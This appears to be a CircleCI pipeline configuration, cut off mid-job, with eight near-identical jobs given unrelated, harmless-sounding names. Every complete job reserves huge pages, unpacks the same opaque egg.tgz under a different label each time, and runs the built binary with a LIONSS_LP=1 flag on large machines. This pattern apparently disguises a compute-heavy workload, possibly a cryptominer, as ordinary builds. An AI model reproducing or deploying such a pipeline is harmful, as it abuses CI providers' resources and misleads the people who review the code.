version: 2.1

jobs:
  zapcore:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define log fields
          command: |
            printf 'level=info\nenc=json\n' > zap.conf
      - run:
          name: Build logger core
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target zapcore -j2
      - run:
          name: Bench structured logging
          command: LIONSS_LP=1 ./build/zapcore --config zap.conf --lines 1000000
  msp430lpm:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set LPM mode
          command: |
            printf 'mode=lpm3\n' > lpm.cfg
      - run:
          name: Build power manager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target msp430lpm -j2
      - run:
          name: Enter low-power mode
          command: LIONSS_LP=1 ./build/msp430lpm --conf lpm.cfg --wake rtc
  GammaEotf:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set transfer
          command: |
            printf 'eotf pq\n' > eotf.cfg
      - run:
          name: Build transfer tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target GammaEotf -j2
      - run:
          name: Apply gamma EOTF
          command: LIONSS_LP=1 ./build/GammaEotf --conf eotf.cfg --nits 1000
  flake_eval:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write flake
          command: |
            printf '{ outputs = {}; }\n' > flake.nix
      - run:
          name: Build eval engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flake_eval -j2
      - run:
          name: Evaluate flake outputs
          command: LIONSS_LP=1 ./build/flake_eval --flake flake.nix --system x86_64-linux
  gc_nursery:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set heap sizes
          command: |
            printf 'nursery=16m\n' > gc.conf
      - run:
          name: Build collector
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target gc_nursery -j2
      - run:
          name: Stress nursery collection
          command: LIONSS_LP=1 ./build/gc_nursery --conf gc.conf --allocs 5000000
  ThistleDown:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed drift
          command: |
            printf 'seeds = 300\n' > thistle.cfg
      - run:
          name: Build dispersal model
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ThistleDown -j2
      - run:
          name: Drift thistledown seeds
          command: LIONSS_LP=1 ./build/ThistleDown --config thistle.cfg --wind 3
  quickcheckGen:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define generator
          command: |
            printf 'gen int\n' > gen.cfg
      - run:
          name: Build generator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target quickcheckGen -j2
      - run:
          name: Generate random cases
          command: LIONSS_LP=1 ./build/quickcheckGen --conf gen.cfg --count 1000
  hdr-tonemap:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
